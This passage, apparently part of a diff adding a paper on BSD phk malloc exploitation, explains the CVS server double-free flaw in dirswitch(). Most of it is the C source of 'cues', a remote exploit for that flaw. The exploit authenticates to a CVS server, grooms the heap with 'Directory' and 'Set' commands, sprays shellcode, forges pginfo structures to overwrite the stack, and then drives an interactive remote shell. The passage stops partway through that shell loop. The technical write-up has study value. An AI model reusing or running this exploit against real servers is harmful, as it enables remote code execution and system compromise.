+  insert a nul byte in the crafted pgfree structure), the way malloc_bytes() and
+  free_bytes() compute the chunk index is different. Thus, the bit that
+  malloc_bytes() sets to zero in the bits field is not the bit that free_bytes()
+  reads to see if the chunk is not already free.
+
+  This means that in most cases, chunks allocated in pages referenced by fake
+  pgfree structures shouldn't be freed by reliable exploits.
+
+                                   ==========
+
+pages directory madness:
+
+  Two more problems occur when inserting fake pgfree structures in the free
+  pages list: first, the pages should not reference a memory area that is very
+  far from the sbrk() memory region, or when the vulnerable program is going to
+  try to use the inserted pages, its computation of their index in the pages
+  directory will completely fail, and it will crash when trying to register them
+  in the page_dir array. In most cases, the stack can not be overwritten this
+  way, but memory regions located near the sbrk() region may (if the BSS is
+  small enough); such regions include: the GOT, the PLT, and DTORS.
+
+  The second problem is that if a fake pgfree structure is used to overwrite a
+  memory region that is already located in the heap, the reference to this
+  memory region in the pages directory will be overwritten by a reference to the
+  buggy page. It may be a problem as well as it may be usefull to a complicated
+  exploit.
+
+                                   ==========
+
+differents BSD flavours:
+
+  *BSD operating systems have different memory mappings: the stack, the heap,
+  and the shared libraries are located at different addresses. Sometimes,
+  completely different techniques will be required to exploit the same
+  vulnerability on the different BSD flavours. Contrarily to FreeBSD and NetBSD,
+  OpenBSD places shared libraries and the brk() region of the heap at low
+  addresses (at least on Intel architectures): the most significant byte of
+  these addresses is a nul byte. It makes exploitation difficult sometimes, but
+  it may also ease it under certain circumstances.
+
+
+
+################################################################################
+
+                               Real life example
+
+The stage is now set to study a real example. It will also demonstrate that a
+double free() is sometimes exploitable on BSD, despite the checks for allocated
+state in free_bytes() and free_pages(). This is the second reason why the CVS
+flaw reported on January, 20th by Stefan Esser was chosen for this paper. For
+those who wonder what the first reason is: the flaw is quite simple to exploit,
+and this helps to keep this presentation as concise as possible. Err... Well,
+ok, ok, ok, to be honest, I must also confess I am contaminated by an incurable
+disease known as laziness.
+
+                                   ==========
+
+First, it is worth reminding what the vulnerability is. The CVS server enables
+the client to specify which directory it needs to access. This job is handled by
+the dirswitch() function, that sets the dir_name static pointer to a dynamically
+allocated copy of the absolute path to the directory the client needs to work
+in. If dir_name is not NULL when dirswitch() is called, it is freed to avoid a
+memory leak. The problem is that if the directory name is improperly specified
+(ie. has a trailing slash), the function returns with dir_name still pointing to
+the former directory name. Thus, an attacker can cause CVS to call
+free(dir_name) an arbitrary number of times. Here is the vulnerable code (from
+cvs-1.11.4/src/server.c):
+
+dirswitch (dir, repos)
+    char *dir;
+    char *repos;
+{
+[...]
+    if (dir_name != NULL)
+        free (dir_name);
+[...]
+    if (dir_len > 0
+        && dir[dir_len - 1] == '/')
+    {
+        if (alloc_pending (80 + dir_len))
+            sprintf (pending_error_text,
+                     "E protocol error: invalid directory syntax in %s", dir);
+        return;
+    }
+
+    dir_name = xmalloc (strlen (server_temp_dir) + dir_len + 40);
+[...]
+}
+
+In order to exploit this vulnerability, an attacker can cause the CVS server to
+allocate a directory name, free it, send commands so that someting else
+(preferably phk malloc structures) is allocated and located where the freed
+directory name was, and free the directory name again. This way, the phk malloc
+structures will be exposed to an overwrite by subsequently allocated data.
+
+                                   ==========
+
+But before proceeding, a short explanation of the server's inner workings is
+required.
+
+The main loop of the CVS server calls the buf_read_line() function to read a
+line from the network (a line is any number of any bytes, possibly nul bytes,
+whose end is marked by a '\n'). buf_read_line() handles a list of buffers where
+incoming data can be stored when no newline character has been met yet. The
+exact way this list is handled doesn't need to be detailed, the important points
+are the following:
+
+  * buffers handling incoming data are allocated 16 by 16, their size is 4096
+    bytes, and, because the CVS server wants these buffers to be aligned on
+    memory pages boundaries, 17 pages are allocated for 16 buffers.
+
+  * Prior to the allocation of the 16 buffers, a set of 16 struct buffer_data
+    structures is allocated (this causes the allocation of a 256 bytes chunk, as
+    these structures are 16 bytes long).
+    
+  * Characters coming from the network connection are appended one after the
+    other to the buffers.
+    
+When a newline is found, the data stored in the buffers is copied to a
+dynamically allocated chunk whose size is of course the size of the line,
+including the trainling '\n'. The trailing newline is replaced by a nul byte in
+this chunk. Then, all buffers employed so far are inserted in the head of a list
+of free buffers that may be used later. Allocated but unused buffers are already
+referenced in the list.
+
+The main loop of the CVS server calls a function determined by the starting
+bytes of the line read by buf_read_line (ie. the command sent by the CVS
+client). At last, the chunk containing the line is freed, and the main loop
+starts again.
+
+If the command is "Directory", the serve_directory() function is called. It
+calls buf_read_line() again to get the name of a repository and calls
+dirswitch(). The first argument passed to dirswitch() is the rest of the first
+line (the line read by the main loop), and the second argument is the repository
+name.
+
+When a badly formed directory name (the names that trigger the vulnerability) is
+given to dirswitch(), an error message is dynamically allocated by dirswitch().
+Its length is 80 plus the length of the second line read by buf_read_line().
+
+When this happens, the "noop" command should be sent to the server, which then
+frees the error message.
+
+At last, when the command sent by the client is "Set", the rest of the line is
+the name of a variable (formed with a restricted set of characters) followed by
+a '=', and then by the variable's value. When the variable has not been sent
+yet, it is inserted in a hash table (thus, the name and value of the variable
+are stored in dynamically allocated buffers, and a 32 bytes structure is
+allocated to handle the variable). Also, if the variable is the first one whose
+name has a given hashing value, another 32 bytes structure is allocated to
+handle the list of variables whose names have the same hashing value. If the
+variable already has a value, its name and value are stored in dynamically
+allocated buffers, then the second buffer containing its name is freed.
+
+                                   ==========
+
+A technique (different from Stefan Esser's) that can be used to exploit the
+vulnerability is to force the allocation of a very large directory name, that
+requires the use of a large chunk. Then, the directory name is freed, and a very
+long line is sent to the server, so that a new set of 16 4k buffers is allocated
+where the directory name was stored. Then, the vulnerability is triggered
+to free this pages again, but they are still referenced in buf_read_line()
+structures. Thus, sending a very long line again will erase these pages. The
+next step is to cause the server to store phk malloc structures in these pages,
+this can be achieved with the "Set" command, that enables the attacker to
+allocate as many chunks as they want. Then, the stack can easily be overwritten
+with, say a 2048 bytes fake chunk. A saved instruction pointer will probably be
+overwritten. The shellcode address is easy to guess: using the "Set" command,
+many chunks containing nops or several copies of the shellcode can be allocated.
+
+                                   ==========
+
+Here is the source code for cues.c:
+
+/*
+ * BSD/i86 remote CVS multiple free() exploit
+ *
+ * tested against NetBSD 1.6 and OpenBSD 3.1
+ *
+ * vulnerability reported in VulnWatch by Stefan Esser on 01/20/2003
+ * http://archives.neohapsis.com/archives/vulnwatch/2003-q1/0028.html
+ *
+ * this code is released under the terms of the GNU GPL license
+ * http://www.gnu.org/licenses/
+ * but I still appreciate beers if you think this stuff is worth it :=)
+ *
+ */
+
+
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <errno.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <getopt.h>
+#include <signal.h>
+
+
+#define PROGNAME "cues"
+
+
+#define DEF_SHELLCODE_PAGES             0x400
+
+#define MAX_FREE_PAGES                  16
+
+#define BUFFER_DATA_SIZE                0x1000
+#define ALLOC_COUNT                     16
+
+
+#define DEF_HEAP_BOTTOM                 0x080C1000
+#define DEF_STACK_TOP                   0xBFBFE000
+#define DEF_MAX_TRIES                   16
+
+
+#define clean_exit(code) do {             \
+                           clean_close(); \
+                           exit(code);    \
+                         } while (0);
+
+
+#define str(pchar) (((pchar)!=NULL)?(pchar):"NULL")
+#define str2(ppchar) (((ppchar)!=NULL)&&((*(ppchar))!=NULL)?(*(ppchar)):"NULL")
+
+
+#define debug(foo) do {                                       \
+                     if (!debug_mode) {                       \
+                       fputs(foo "\n",stderr);                \
+                     } else {                                 \
+                       fputs(foo ",press key",stderr);        \
+                       fgetc(stdin);                          \
+                     }                                        \
+                   } while(0)
+
+
+unsigned char hellcode[0x1000/2];
+unsigned int sent=0;
+unsigned int port=2401;
+unsigned int debug_mode=0;
+unsigned int timeout=3;
+unsigned int session_sent;
+unsigned int got_SIGALRM=0;
+unsigned int shellcode_pages=DEF_SHELLCODE_PAGES;
+int sock=-1;
+char *victim;
+char *repository;
+char *user;
+char *password=NULL;
+
+
+void SIGALRM_handler() {
+  got_SIGALRM=1;
+}
+
+
+void clean_close(void) {
+  char buffer[8192];
+  int i;
+
+  if (sock!=-1) {
+    fcntl(sock,F_SETFL,0);
+    signal(SIGALRM,SIGALRM_handler);
+    alarm(timeout);
+    while ((i=recv(sock,buffer,sizeof(buffer),MSG_NOSIGNAL))>0);
+    alarm(0);
+    if (i) {
+      if (errno!=EPIPE && !got_SIGALRM) {
+        perror(PROGNAME " - recv");
+        exit(EXIT_FAILURE);
+      }
+    }
+    close(sock);
+  }
+  sock=-1;
+}
+
+
+#define in_address (*((struct sockaddr_in *)&address))
+void xconnect(char *host,unsigned int port) {
+  static struct sockaddr address;
+  static char *shost=NULL;
+  struct hostent *h;
+
+  if (shost==NULL) {
+    h=gethostbyname(host);
+    if (h==NULL) {
+      fprintf(stderr,PROGNAME " - gethostbyname(%s): %s\n",host,
+              hstrerror(h_errno));
+      exit(EXIT_FAILURE);
+    }
+    memset(&address,0,sizeof(address));
+    in_address.sin_family=AF_INET;
+    in_address.sin_port=htons(port);
+    in_address.sin_addr=*((struct in_addr *)h->h_addr);
+    shost=strdup(inet_ntoa(in_address.sin_addr));
+    if (shost==NULL) {
+      fputs(PROGNAME " - strdup: unable to allocate memory\n",stderr);
+      exit(EXIT_FAILURE);
+    }
+  }
+
+  if (sock!=-1) {
+    close(sock);
+  }
+
+  sock=socket(AF_INET,SOCK_STREAM,0);
+  if (sock<0) {
+    perror(PROGNAME " - socket");
+    exit(EXIT_FAILURE);
+  }
+
+  if (connect(sock,&address,sizeof(address))<0) {
+    perror(PROGNAME " - connect");
+    exit(EXIT_FAILURE);
+  }
+  fprintf(stderr,"connected to %s:%hu\n",shost,ntohs(in_address.sin_port));
+}
+#undef in_address
+
+
+void SIGSTOP_handler() {
+  clean_exit(1);
+}
+
+
+/* computes the CVS password */
+char* scramble(char *str) {
+  static unsigned char shifts[]={
+    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15,
+   16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31,
+  114,120, 53, 79, 96,109, 72,108, 70, 64, 76, 67,116, 74, 68, 87,
+  111, 52, 75,119, 49, 34, 82, 81, 95, 65,112, 86,118,110,122,105,
+   41, 57, 83, 43, 46,102, 40, 89, 38,103, 45, 50, 42,123, 91, 35,
+  125, 55, 54, 66,124,126, 59, 47, 92, 71,115, 78, 88,107,106, 56,
+   36,121,117,104,101,100, 69, 73, 99, 63, 94, 93, 39, 37, 61, 48,
+   58,113, 32, 90, 44, 98, 60, 51, 33, 97, 62, 77, 84, 80, 85,223,
+  225,216,187,166,229,189,222,188,141,249,148,200,184,136,248,190,
+  199,170,181,204,138,232,218,183,255,234,220,247,213,203,226,193,
+  174,172,228,252,217,201,131,230,197,211,145,238,161,179,160,212,
+  207,221,254,173,202,146,224,151,140,196,205,130,135,133,143,246,
+  192,159,244,239,185,168,215,144,139,165,180,157,147,186,214,176,
+  227,231,219,169,175,156,206,198,129,164,150,210,154,177,134,127,
+  182,128,158,208,162,132,167,209,149,241,153,251,237,236,171,195,
+  243,233,253,240,194,250,191,155,142,137,245,235,163,242,178,152};
+  unsigned int i;
+  static unsigned char *s=NULL;
+
+  if (s!=NULL) {
+    return s;
+  }
+
+  s=malloc(strlen(str)+2);
+  if (s==NULL) {
+    fputs(PROGNAME " - malloc: unable to allocate memory\n",stderr);
+    clean_exit(EXIT_FAILURE);
+  }
+
+  s[0]=0x41;
+  strcpy(s+1,str);
+  for (i=1;s[i];i++) {
+    s[i]=shifts[(s[i])];
+  }
+
+  return s;
+}
+
+
+void do_send(unsigned char *data,unsigned int length) {
+  int i;
+
+  while (length) {
+    i=send(sock,data,length,MSG_NOSIGNAL);
+    if (i<0) {
+      perror(PROGNAME " - send");
+      clean_exit(EXIT_FAILURE);
+    }
+    if (!i) {
+      fputs(PROGNAME " - short send\n",stderr);
+      clean_exit(EXIT_FAILURE);
+    }
+    length-=i;
+    sent+=i;
+    session_sent+=i;
+  }
+}
+
+
+/* connects to the server and logs in */
+void login(void) {
+  int i;
+  char *buf;
+  char *p;
+
+  xconnect(victim,port);
+  buf=malloc(80+strlen(repository)+strlen(user)+
+             ((password!=NULL)?strlen(password):0));
+  if (buf==NULL) {
+    fputs(PROGNAME " - malloc: unable to allocate memory\n",stderr);
+    clean_exit(EXIT_FAILURE);
+  }
+  p=scramble(password);
+  i=sprintf(buf,"BEGIN AUTH REQUEST\n%s\n%s\n%s\nEND AUTH REQUEST\n",
+            repository,user,p);
+  do_send(buf,i);
+  if (recv(sock,buf,64,MSG_NOSIGNAL)<0) {
+    perror(PROGNAME " - recv");
+    clean_exit(EXIT_FAILURE);
+  }
+  if (memcmp(buf,"I LOVE YOU\n",11)) {
+    fputs(PROGNAME ": authentication failure or wrong repository\n",stderr);
+    clean_exit(EXIT_FAILURE);
+  }
+  session_sent=0;
+}
+
+
+/* tests wether pattern is in str */
+unsigned int strin(char *str,char *pattern) {
+  unsigned int l;
+
+  l=strlen(pattern);
+  if (!l || strlen(str)<l) {
+    return 0;
+  }
+  while (str[l-1]) {
+    if (!memcmp(str,pattern,l)) {
+      return 1;
+    }
+    str++;
+  }
+  return 0;
+}
+
+
+/* asks to the server if a command has caused an error */
+unsigned int get_pending_error(char **str,char *pattern,unsigned int noopsent) {
+  static char buf[8192];
+  unsigned int ret;
+  unsigned int j;
+  unsigned int k;
+  int line_count;
+  char *p;
+  int i;
+  unsigned char c;
+
+  ret=0;
+  p=NULL;
+  i=0;
+  c=0;
+  if (!noopsent) {
+    do_send("noop\n",5);
+  }
+  line_count=-1;
+  buf[0]=0;
+  j=0;
+  if (pattern!=NULL) {
+    k=strlen(pattern);
+  } else {
+    k=0;
+  }
+  for (;;) {
+    if (!buf[0]) {
+      do {
+        i=recv(sock,buf,sizeof(buf)-1,MSG_NOSIGNAL);
+        if (i<0) {
+          perror(PROGNAME " - recv");
+          clean_exit(EXIT_FAILURE);
+        }
+        if (!i)  {
+          fputs(PROGNAME " - connection unexpectedly closed\n",stderr);
+          clean_exit(EXIT_FAILURE);
+        }
+        buf[i]=0;
+        j+=i;
+        p=strchr(buf,'\n');
+      } while (p==NULL && j<k+2);
+      j=k+42;
+    }
+    if (line_count==-1) {
+      line_count++;
+      c=buf[0];
+      if (c!='E') {
+        if (str!=NULL) {
+          *str=NULL;
+        }
+      } else {
+        if (str!=NULL) {
+          *str=strdup(buf);
+          if (*str==NULL) {
+            fputs(PROGNAME " - memory allocation failed\n",stderr);
+            clean_exit(EXIT_FAILURE);
+          }
+        }
+        if (pattern!=NULL) {
+          ret=strin(buf,pattern);
+        } else {
+          ret=1;
+        }
+      }
+    }
+    if (p!=NULL) {
+      if (!line_count) {
+        if (c!='E') {
+          if (debug_mode) {
+            fprintf(stderr,"[get_pending_error(%s)] no error\n",str(pattern));
+          }
+          return 0;
+        }
+      } else {
+        if (debug_mode) {
+          fprintf(stderr,"[get_pending_error(%s)] error:\n%s############\n",
+                  str(pattern),str2(str));
+        }
+        return ret;
+      }
+      line_count++;
+      p++;
+      memmove(buf,p,i-(p-buf));
+    } else {
+      buf[0]=0;
+    }
+  }
+}
+
+
+/* makes sure each list in the hash table of the server contains at least one
+ * element */
+unsigned int initialize_remote_hash_table(void) {
+  static unsigned char buf[]="Set aaaaaaaaaaaaaaZZ=aaaaaaaaaaaaaaaa\n";
+  unsigned int i;
+  unsigned int j;
+  unsigned int leaked_bytes;
+
+  leaked_bytes=0;       /* in fact, this should be set to 151*32 */
+  for (i='a';i<='z';i++) {
+    buf[18]=(unsigned char)i;
+    for (j='a';j<='z';j++) {
+      buf[19]=(unsigned char)j;
+      do_send(buf,sizeof(buf)-1);
+      leaked_bytes+=3*32;
+    }
+  }
+
+  return leaked_bytes;
+}
+
+
+#define dirty_max(a,b) (((a)>(b))?(a):(b))
+#define buf_siz dirty_max(3*(ALLOC_COUNT+1)*BUFFER_DATA_SIZE,shellcode_pages*80)
+void prepare_heap(void) {
+  unsigned int leaked_bytes;
+  unsigned int i;
+  unsigned int j;
+  unsigned int k;
+  char *err;
+  unsigned char *buffer;
+
+  buffer=malloc(buf_siz+0x1000);
+  if (buffer==NULL) {
+    fputs(PROGNAME " - unable to allocate memory\n",stderr);
+    clean_exit(EXIT_FAILURE);
+  }
+
+  /* send necessary command before anything else */
+  i=sprintf(buffer,"Root %s\n",repository);
+  do_send(buffer,i);
+
+  /* make server_temp_dir at least one page long */
+  i=sprintf(buffer,"Max-dotdot %u\n",0x1000/2);
+  do_send(buffer,i);
+
+  /* 16 bytes gaps and 16 bytes areas will be needed */
+  for (j=0,i=0;i<42*2+2;i++) {
+    j+=sprintf(buffer+j,"Set k%u=0\n",i);
+  }
+  for (i=0;i<42+10;i++) {
+     j+=sprintf(buffer+j,"Set k%u=0123456789abcdef\n",i);
+  }
+  do_send(buffer,j);
+
+  /* also prepare 2 32 bytes areas */
+  j=sprintf(buffer,"Set area_a=%016u\nSet area_b=%16u\n",0,0);
+  do_send(buffer,j);
+
+  /* and an additional shellcode_pages 32 bytes areas */
+  for (i=j=0;i<shellcode_pages+2;i++) {
+    j+=sprintf(buffer+j,"Set x%015u=%016u\n",i,0);
+  }
+  do_send(buffer,j);
+  j=sprintf(buffer,"Set x%015u=0\nSet x%015u=0\nSet x%015u=0\n",0,1,2);
+  do_send(buffer,j);
+
+  /* check everything went well so far */
+  if (get_pending_error(&err,NULL,0)) {
+    fprintf(stderr,PROGNAME " - unexpected error from server:\n%s\n",err);
+    clean_exit(EXIT_FAILURE);
+  }
+
+  /* put many shellcodes in memory */
+  fprintf(stderr,"  leaking 0x%X bytes of memory%s",
+          shellcode_pages*0x1000,debug_mode?", press key":"...\n");
+  if (debug_mode) {
+    fgetc(stdin);
+  }
+  for (i=0;i<shellcode_pages*0x1000;i+=sizeof(hellcode)) {
+    j=sprintf(buffer,"Set x%015u=",i/sizeof(hellcode));
+    do_send(buffer,j);
+    do_send(hellcode,sizeof(hellcode));
+  }
+
+  /* put (ALLOC_COUNT-1)*BUFFER_DATA_SIZE+1 bytes in dir_name */
+  j=sprintf(buffer,"Directory ");
+  for (i=j;i<(ALLOC_COUNT-1)*BUFFER_DATA_SIZE+j;i++) {
+    buffer[i]='a';
+  }
+  buffer[i]='\n';
+  do_send(buffer,i+1);
+  j=sprintf(buffer,"%s/.\n",repository);
+  do_send(buffer,j);
+  if (!get_pending_error(&err,"cannot mkdir",0)) {
+    fputs(PROGNAME " - didn't receive \"cannot mkdir\" from server\n",stderr);
+    if (err!=NULL) {
+      fprintf(stderr,"instead, got:\n%s\n",err);
+    }
+    clean_exit(EXIT_FAILURE);
+  }
+  free(err);
+
+  /* get rid of empty pages (existing gaps and pages left by previously sent
+   * commands) */
+  leaked_bytes=initialize_remote_hash_table();
+  for (i=0;leaked_bytes<(MAX_FREE_PAGES+ALLOC_COUNT)*0x1000;i++) {
+    j=sprintf(buffer,"Set a%015u=0123456789abcdef\n",i);
+    do_send(buffer,j);
+    leaked_bytes+=3*32;
+  }
+
+  /* create two 64 bytes gaps */
+  i=sprintf(buffer,"Set f%015u=%032u\nSet f%015u=%032u\nSet f%031u=%016u\n"
+                   "Set f%015u=%016u\nSet f%015u=%016u\n",0,0,1,0,2,0,0,0,1,0);
+  do_send(buffer,i);
+  debug("  created two 64 bytes gaps");
+
+  /* free dir_name, this also causes a malloc(80+strlen("foo/")) and the
+   * associated free to occur, one 84 bytes gap is thus prepared before the
+   * "Directory" command is sent (in fact, two 128 bytes gaps) */
+  i=sprintf(buffer,"Set b%015u=%083u\nSet b%015u=%083u\nSet b%015u=%016u\n",
+            0,0,1,0,0,0);
+  do_send(buffer,i);
+  i=sprintf(buffer,"Directory foo/\n%s/\n",repository);
+  do_send(buffer,i);
+  debug("  freed dir_name");
+  if (!get_pending_error(&err,"protocol error: invalid directory syntax ",0)) {
+    fputs(PROGNAME " - didn't receive \"invalid directory syntax \" from "
+          "server\n",stderr);
+    if (err!=NULL) {
+      fprintf(stderr,"instead, got:\n%s\n",err);
+    }
+    clean_exit(EXIT_FAILURE);
+  }
+  free(err);
+
+  /* allocate and free much data so that the 17 freed pages are added to the
+   * reception buffers list, but leave the first pages at the end of the list */
+  j=sprintf(buffer,"noop ");
+  for (i=j;i<(2*ALLOC_COUNT+1)*BUFFER_DATA_SIZE+j;i++) {
+    buffer[i]='a';
+  }
+  buffer[i]='\n';
+  do_send(buffer,i+1);
+  debug("  allocated new reception buffers data");
+
+  /* check everything went well so far */
+  if (get_pending_error(&err,NULL,1)) {
+    fprintf(stderr,PROGNAME " - unexpected error from server:\n%s\n",err);
+    clean_exit(EXIT_FAILURE);
+  }
+
+  /* free dir_name ie. the aforementionned 17 pages again (here is the flaw) */
+  i=sprintf(buffer,"Directory foo/\n%s/\n",repository);
+  do_send(buffer,i);
+  debug("  freed dir_name again");
+  if(!get_pending_error(&err,"protocol error: invalid directory syntax in",0)) {
+    fputs(PROGNAME " - didn't receive \"invalid directory syntax in\" from "
+          "server\n",stderr);
+    if (err!=NULL) {
+      fprintf(stderr,"instead, got:\n%s\n",err);
+    }
+    clean_exit(EXIT_FAILURE);
+  }
+  free(err);
+
+  /* force the allocation of 3 32 bytes chunks memory pages, they will be placed
+   * at the beginning of the 17 pages */
+  for (i=0,j=0,k=0;i<3*(0x1000-32);i+=3*32,k++) {
+    j+=sprintf(buffer+j,"Set d%015x=0123456789abcdef\n",k);
+  }
+  do_send(buffer,j);
+  debug("  3 32 bytes chunks pages allocated");
+
+  /* create some 32 bytes gaps in the two last pages... */
+  for (j=0,i=k-3;i>k-42-3;i--) {
+    j+=sprintf(buffer+j,"Set d%015x=0\n",i);
+  }
+  do_send(buffer,j);
+  debug("  created 32 bytes gaps");
+
+  /* allocate three 2k bytes chunks */
+  i=sprintf(buffer,"Set z00=");
+  for (j=i;j<0x1000/4+1+i;j++) {
+    buffer[j]='a';
+  }
+  buffer[j]='\n';
+  do_send(buffer,j+1);
+  buffer[i-2]='1';
+  do_send(buffer,j+1);
+  buffer[i-2]='2';
+  do_send(buffer,j+1);
+
+  /* free the 2nd 2k bytes chunk, this creates a gap and the associated pginfo
+   * resides in one of the 32 bytes gaps */
+  buffer[i+1]='\n';
+  buffer[i-2]='1';
+  do_send(buffer,i+2);
+  debug("  created the 2k bytes gap");
+
+  /* create two safe 32 bytes gaps */
+  j=sprintf(buffer,"Set area_a=0\nSet area_b=0\n");
+  do_send(buffer,j);
+
+  /* check everything went well so far */
+  if (get_pending_error(&err,NULL,0)) {
+    fprintf(stderr,PROGNAME " - unexpected error from server:\n%s\n",err);
+    clean_exit(EXIT_FAILURE);
+  }
+  free(err);
+
+  free(buffer);
+}
+
+
+#define PUT32(addr,val) do {                                             \
+                          ((unsigned char *)(addr))[0]=(val)&0xff;       \
+                          ((unsigned char *)(addr))[1]=((val)>>8)&0xff;  \
+                          ((unsigned char *)(addr))[2]=((val)>>16)&0xff; \
+                          ((unsigned char *)(addr))[3]=((val)>>24)&0xff; \
+                        } while (0)
+
+#define PUT16(addr,val) do {                                             \
+                          ((unsigned char *)(addr))[0]=(val)&0xff;       \
+                          ((unsigned char *)(addr))[1]=((val)>>8)&0xff;  \
+                        } while (0)
+
+void try_overwrite(unsigned int address,unsigned int shellcode_address) {
+  unsigned char buffer[BUFFER_DATA_SIZE];
+  unsigned int i;
+
+  /* prepare a fake pginfo structure */
+    /* next field doesn't matter */
+    PUT32(buffer,0x41414141);
+    /* page field: the address to overwrite (we will play with the bits field
+     * if this address contains forbidden characters) */
+    i=address;
+    if ((i&0xff0000)==0x0a0000) {
+      i-=0x010000;
+    }
+    if ((i&0xff000000)==0x0a000000) {
+      i-=0x01000000;
+    }
+    PUT32(buffer+4,i);
+    /* size field: 0 so that even if malloc_junk is set, nothing happens */
+    PUT16(buffer+8,0);
+    /* shift field: pretend we use 0x010000 bytes chunks */
+    PUT16(buffer+10,24);
+    /* free field: we have many free chunks, don't we? :=) */
+    PUT16(buffer+12,0xaa);
+    /* total field: who cares? */
+    PUT16(buffer+14,0xcc);
+    /* bits field */
+    memset(buffer+16,0,16);
+    if ((address&0xff0000)!=0x0a0000) {
+      if ((address&0xff000000)!=0x0a000000) {
+        buffer[16]=0xff;
+      } else {
+        buffer[16+0x1000000/0x10000]=0xff;
+      }
+    } else {
+      if ((address&0xff000000)!=0x0a000000) {
+        buffer[16]=0xfe;
+      } else {
+        buffer[16+0x1000000/0x10000]=0xfe;
+      }
+    }
+
+  /* copy the fake pginfo in the whole page */
+  for (i=0;i<(BUFFER_DATA_SIZE-31);i+=32) {
+    memcpy(buffer+i,buffer,32);
+  }
+
+  /* set bufp to 0 on victim */
+  if ((session_sent%BUFFER_DATA_SIZE)>(BUFFER_DATA_SIZE/2)) {
+    do_send("noop ",5);
+    do_send(buffer,BUFFER_DATA_SIZE/2-42);
+    do_send("\n",1);
+    get_pending_error(NULL,NULL,1);
+  } else if ((session_sent%BUFFER_DATA_SIZE)<42) {
+    do_send("noop ",5);
+    do_send(buffer,BUFFER_DATA_SIZE/2+42);
+    do_send("\n",1);
+    get_pending_error(NULL,NULL,1);
+  }
+  if (session_sent%BUFFER_DATA_SIZE) {
+    do_send("noop ",5);
+    do_send(buffer,BUFFER_DATA_SIZE-(session_sent%BUFFER_DATA_SIZE)-1);
+    do_send("\n",1);
+    get_pending_error(NULL,NULL,1);
+  }
+  debug("  bufp set to 0");
+
+  /* overwrite the pginfos for 2k bytes chunks */
+  do_send("noop ",5);
+  do_send(buffer+5,BUFFER_DATA_SIZE-5);
+  for (i=1;i<3*ALLOC_COUNT-2;i++) {
+    do_send(buffer,BUFFER_DATA_SIZE);
+  }
+  do_send("\n",1);
+  debug("  pginfo of 2k bytes chunks page overwritten");
+  get_pending_error(NULL,NULL,1);
+
+  /* overwrite the target */
+  for (i=0;i<0x1000/2-4;i+=4) {
+    PUT32(buffer+i,shellcode_address);
+  }
+  buffer[i-1]=0xff; /* crash probability = 0 against OpenBSD hehehe */
+  buffer[i]='\n';
+  debug("  overwriting stack");
+  do_send(buffer,i+1);
+}
+
+
+#define SPECIAL_STRING "knock knock knock knock knock"
+
+void try_shell(void) {
+  unsigned char rcvbuf[8192];
+  unsigned char sndbuf[8192];
+  fd_set rcvset;
+  fd_set sndset;
+  struct timeval tout;
+  unsigned int rcvbufpos;
+  unsigned int sndbufpos;
+  unsigned int quit;
+  int i;
+  int n;
+  char *p;
+
+  rcvbufpos=0;
+  sndbufpos=0;
+  sleep(timeout);
+  i=send(sock,"echo " SPECIAL_STRING "\n",5+sizeof(SPECIAL_STRING),
+         MSG_NOSIGNAL);
+  if (i<0) {
+    if (errno==EPIPE) {
+      return;
+    } else {
+      perror(PROGNAME " - send");
+      clean_exit(EXIT_FAILURE);
+    }
+  } else if (!i) {
+    return;
+  }
+  FD_ZERO(&rcvset);
+  FD_SET(sock,&rcvset);
+  tout.tv_sec=timeout;
+  tout.tv_usec=0;
+  i=select(sock+1,&rcvset,NULL,NULL,&tout);
+  if (i<0) {
+    perror(PROGNAME " - select");
+    clean_exit(EXIT_FAILURE);
+  } else if (!i) {
+    return;
+  }
+  i=recv(sock,rcvbuf,sizeof(rcvbuf)-1,MSG_NOSIGNAL);
+  if (i<0) {
+    if (errno==EPIPE) {
+      return;
+    } else {
+      perror(PROGNAME " - recv");
+      clean_exit(EXIT_FAILURE);
+    }
+  } else if (!i) {
+    return;
+  }
+  rcvbuf[i]=0;
+  if (!strin(rcvbuf,SPECIAL_STRING+sizeof(SPECIAL_STRING)/2)) {
+    fputs("warning: didn't crash, but didn't send signature\n??? ",stderr);
+    return;
+  }
+  fprintf(stderr,"%u bytes sent\n\n",sent);
+  for (p="GREETINGS PROFESSOR FALKEN.\n";*p;p++) {
+    fputc(*p,stderr);
+    fflush(stdout);
+    usleep(100000);
+  }
+
+  if (!fcntl(sock,F_SETFL,O_NONBLOCK|O_ASYNC)) {
+    fputc('\n',stderr);
+  } else {
+    fprintf(stderr,"warning: could not set non blocking io: %s\n\n",
+            strerror(errno));
+  }
+
+  n=dirty_max(STDIN_FILENO,STDOUT_FILENO);
+  n=dirty_max(n,sock);
+  n++;
+  quit=0;
+  do {
+    FD_ZERO(&rcvset);
+    if (sndbufpos<sizeof(sndbuf)) {
+      FD_SET(STDIN_FILENO,&rcvset);
+    }
+    if (rcvbufpos<sizeof(rcvbuf)){
+      FD_SET(sock,&rcvset);
+    }
+    FD_ZERO(&sndset);
+    if (rcvbufpos) {
+      FD_SET(STDOUT_FILENO,&sndset);
+    }
+    if (sndbufpos) {
+      FD_SET(sock,&sndset);
+    }
+    i=select(n,&rcvset,&sndset,NULL,NULL);
+    if (i<0) {
+      perror(PROGNAME " - select");
+      exit(EXIT_FAILURE);
+    }
+    if (FD_ISSET(sock,&rcvset)) {
+      i=recv(sock,rcvbuf+rcvbufpos,sizeof(rcvbuf)-rcvbufpos,MSG_NOSIGNAL);
+      if (i<0) {
+        perror(PROGNAME " - recv");
+        exit(EXIT_FAILURE);
+      }
+      if (!i) {
+        quit=2;
+      }
+      rcvbufpos+=i;
+    }
+    if (FD_ISSET(STDIN_FILENO,&rcvset)) {
+      i=read(STDIN_FILENO,sndbuf+sndbufpos,sizeof(sndbuf)-sndbufpos);
+      if (i<0) {
+        perror(PROGNAME " - read");
+        exit(EXIT_FAILURE);
+      }
+      if (!i) {
+        quit=1;
+      }
+      sndbufpos+=i;
+    }
+    if (FD_ISSET(sock,&sndset)) {
+      i=send(sock,sndbuf,sndbufpos,MSG_NOSIGNAL);
+      if (i<0) {
+        perror(PROGNAME " - send");
+        exit(EXIT_FAILURE);
+      }
+      memmove(sndbuf,sndbuf+i,sndbufpos-i);
+      sndbufpos-=i;
+    }
